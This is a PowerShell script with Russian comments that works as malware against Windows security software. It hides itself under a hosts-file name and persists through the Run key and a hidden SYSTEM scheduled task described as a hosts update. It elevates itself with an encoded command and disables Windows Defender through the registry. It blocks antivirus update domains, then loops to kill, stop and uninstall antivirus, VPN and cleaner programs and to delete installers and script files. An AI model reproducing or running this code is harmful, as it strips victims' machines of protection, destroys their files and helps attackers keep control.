$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$taskScriptPath = "C:\Windows\System32\drivers\etc\hosts.ps1" 
$hiddenDir = "C:\System\WinSxS\Backup"

if ($MyInvocation.MyCommand.Path -ne $taskScriptPath) {
    # Создаем скрытую директорию
    New-Item -ItemType Directory -Path $hiddenDir -Force -Attributes Hidden | Out-Null
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $taskScriptPath -Force
    
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsHostsUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$taskScriptPath`"" -PropertyType String -Force
    
    $bytes = [System.Text.Encoding]::Unicode.GetBytes("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$taskScriptPath`"")
    $encoded = [Convert]::ToBase64String($bytes)
    Start-Process powershell.exe -ArgumentList "-EncodedCommand $encoded" -Verb RunAs -WindowStyle Hidden
    exit
}

$taskName = "WindowsHostsUpdate"
$taskDescription = "Обновление файла hosts и сетевых настроек" # Маскировка под легитимную задачу

Get-ScheduledTask | Where-Object { $_.TaskName -like "*Hosts*" -or $_.TaskName -like "*Update*" } | Unregister-ScheduledTask -Confirm:$false

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$taskScriptPath`""
$trigger = @(
    (New-ScheduledTaskTrigger -AtLogOn),
    (New-ScheduledTaskTrigger -Daily -At "3:00 AM"),
    (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 5))
)
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -Hidden
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -RunLevel Highest -LogonType ServiceAccount

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description $taskDescription -Force

$blockList = @(
    "msmpeng", "windefend", "securityhealthservice", "securitycenter", "windowsdefender", "mpcmdrun", "smartscreen", "wsc_proxy",
    
    "avast", "avg", "eset", "kaspersky", "norton", "mcafee", "sophos", "bitdefender", "malwarebytes", "trendmicro",
    
    "360", "qqpcmgr", "baidu", "tencent", "rising", "huorong",
    
    "crowdstrike", "cylance", "sentinel", "carbonblack", "tanium", "deepinstinct",
    
    "panda", "gdata", "fsecure", "vipre", "webroot", "bullguard", "adaware", "emsisoft", "comodo", "zonealarm",
    
    "ccleaner", "wisecare", "advancedsystemcare", "glary", "iobit", "ashampoo",
    
    "protonvpn", "nordvpn", "expressvpn", "windscribe", "hotspotshield", "tunnelbear",
    
    "antivirus", "antimalware", "security", "shield", "protect", "firewall", "scan", "safeguard", "defender", "guard"
)

$exeBlockList = @(
    "setup", "install", "av_", "antivirus", "security", "defender", "protect", 
    "kaspersky", "eset", "nod32", "avast", "avg", "norton", "mcafee",
    "360", "qq", "baidu", "tencent", "cleaner", "optimizer", "vpn"
)

$scanPaths = @(
    "$env:ProgramFiles", 
    "$env:ProgramFiles (x86)", 
    "$env:USERPROFILE\Downloads", 
    "$env:USERPROFILE\Desktop",
    "$env:APPDATA\Local\Temp",
    "$env:PUBLIC\Downloads"
)


$defenderPaths = @(
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
    "HKLM:\SOFTWARE\Microsoft\Windows Defender"
)
foreach ($path in $defenderPaths) {
    New-Item -Path $path -Force | Out-Null
    Set-ItemProperty -Path $path -Name "DisableAntiSpyware" -Value 1 -Force
    Set-ItemProperty -Path $path -Name "DisableAntiVirus" -Value 1 -Force
    Set-ItemProperty -Path $path -Name "Real-Time Protection" -Value 0 -Force
}

$firewall = New-Object -ComObject HNetCfg.FWPolicy2
foreach ($port in @(80, 443, 53)) {
    $firewall.Rules.Add("BlockAVUpdate$port", 2, 0).Protocol = 6
    $firewall.Rules.Item("BlockAVUpdate$port").LocalPorts = $port.ToString()
    $firewall.Rules.Item("BlockAVUpdate$port").Action = 0
    $firewall.Rules.Item("BlockAVUpdate$port").Enabled = $true
}

$avDomains = @("update.avast.com", "liveupdate.symantecliveupdate.com", "update.eset.com", "dnl-xx.geo.kaspersky.com")
$hostsContent = Get-Content "$env:windir\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue
foreach ($domain in $avDomains) {
    if ($hostsContent -notcontains "127.0.0.1 $domain") {
        Add-Content -Path "$env:windir\System32\drivers\etc\hosts" -Value "127.0.0.1 $domain" -Force
    }
}

while ($true) {
    # Убиваем процессы
    foreach ($proc in (Get-Process | Where-Object { 
        $_.ProcessName -match ($blockList -join "|") -or 
        $_.Path -match ($blockList -join "|") -or
        $_.Company -match "antivirus|security"
    })) {
        Stop-Process -Id $proc.Id -Force
    }

    $installed = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
                                  "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
                 Where-Object { 
                     $_.DisplayName -match ($blockList -join "|") -or 
                     $_.Publisher -match "antivirus|security"
                 }
    
    foreach ($app in $installed) {
        # Попытка удаления через собственный деинсталлятор
        if ($app.UninstallString) {
            Start-Process "cmd.exe" -ArgumentList "/c $($app.UninstallString) /S /quiet" -Wait -WindowStyle Hidden
        }
        Remove-Item -Path $app.PSPath -Recurse -Force
    }

    foreach ($path in $scanPaths) {
        Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue | Where-Object {
            $_.Name -match ($exeBlockList -join "|") -or
            $_.Extension -eq ".msi" -or
            $_.Extension -eq ".bat" -or
            $_.Extension -eq ".cmd"
        } | Remove-Item -Force -Recurse
    }

    Get-Service | Where-Object { 
        $_.Name -match ($blockList -join "|") -or 
        $_.DisplayName -match ($blockList -join "|")
    } | Stop-Service -Force -PassThru | Set-Service -StartupType Disabled

    Get-ScheduledTask | Where-Object { 
        $_.TaskName -match ($blockList -join "|") -or 
        $_.Description -match "antivirus|update|security"
    } | Unregister-ScheduledTask -Confirm:$false

    Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 10)
}